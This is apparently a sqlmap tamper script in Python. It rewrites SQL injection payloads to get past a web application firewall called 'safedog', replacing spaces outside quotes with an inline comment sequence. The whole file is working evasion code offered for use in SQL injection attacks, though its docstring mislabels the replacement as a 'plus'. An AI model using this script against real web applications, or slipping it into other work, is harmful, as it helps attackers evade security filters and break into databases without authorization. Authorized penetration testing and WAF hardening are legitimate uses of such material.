#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW # Change priority

'''
class PRIORITY:
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100
class DBMS:
    ACCESS = "Microsoft Access"
    DB2 = "IBM DB2"
    FIREBIRD = "Firebird"
    MAXDB = "SAP MaxDB"
    MSSQL = "Microsoft SQL Server"
    MYSQL = "MySQL"
    ORACLE = "Oracle"
    PGSQL = "PostgreSQL"
    SQLITE = "SQLite"
    SYBASE = "Sybase"
    HSQLDB = "HSQLDB"
'''

def dependencies():
    pass
	
def tamper(payload, **kwargs):

    """
	Bypass safedog 

    Replaces space character (' ') with plus ('/*|%20--%20|*/')
    >>> tamper('SELECT id FROM users')
    'SELECT/*|%20--%20|*/id/*|%20--%20|*/FROM/*|%20--%20|*/users'

    """

    retVal = payload
    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/*|%20--%20|*/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/*|%20--%20|*/"
                continue

            retVal += payload[i]

    return retVal